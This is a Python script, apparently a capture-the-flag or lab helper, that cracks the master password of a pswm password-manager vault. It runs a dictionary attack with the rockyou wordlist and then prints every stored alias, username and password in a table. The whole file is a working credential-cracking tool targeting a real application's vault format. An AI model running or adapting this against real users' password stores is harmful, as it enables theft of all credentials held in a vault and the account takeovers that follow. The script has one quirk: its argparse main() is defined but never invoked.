import cryptocode
import argparse
from prettytable import PrettyTable


#加密值所在的文件
PASS_VALUE_FILE = ".local/share/pswm/pswm"
#字典
WORDLIST_FILE = "/usr/share/wordlists/rockyou.txt"

def get_encrypt_value():
    with open(PASS_VALUE_FILE, "r") as file:
        return file.read()

def try_passwd(password,encrypted_value):
    decrypt_text = cryptocode.decrypt(encrypted_value,password)
    if decrypt_text:
        print(f"Password: {password}")
        print(f"Decrypted Text: {decrypt_text}")
        return True
    return False

def print_decrypted_text(decrypted_text):
    table = PrettyTable()
    table.field_names = ["Alias", "Username", "Password"]
    for line in decrypted_text.splitlines():
        alias, username, password = line.split("\t")
        table.add_row([alias.strip(), username.strip(), password.strip()])
    table.align = "l"
    print("[+] Decrypted Data:")
    print(table)

def burte_force_with_wordlist(encrypted_text=None, wordlist=None):
    if encrypted_text is None or wordlist is None:
        encrypted_text = get_encrypt_value()
        with open(WORDLIST_FILE,"r",encoding='utf-8',errors='ignore') as file:
            for line in file:
                password = line.strip()
                if try_passwd(password,encrypted_text):
                    break
        print("NO NO NO! GET OUT!")
    else:
        with open(wordlist, "r", encoding="utf-8") as f:
            for password in f:
                decrypted_text = cryptocode.decrypt(encrypted_text, password.strip())
                if decrypted_text:
                    print("[+] Master Password: %s" % password.strip())
                    print_decrypted_text(decrypted_text)
                    return
        print("[-] Password Not Found!")

def main():
    parser = argparse.ArgumentParser(description="pswm master password cracker")
    parser.add_argument("-f", "--file", required=True, help="Path to the encrypted file")
    parser.add_argument("-w", "--wordlist", required=True, help="Path to the wordlist file")
    args = parser.parse_args()

    with open(args.file, "r") as f:
        encrypted_text = f.read().strip()

    burte_force_with_wordlist(encrypted_text, args.wordlist)

if __name__ == "__main__":
    burte_force_with_wordlist()

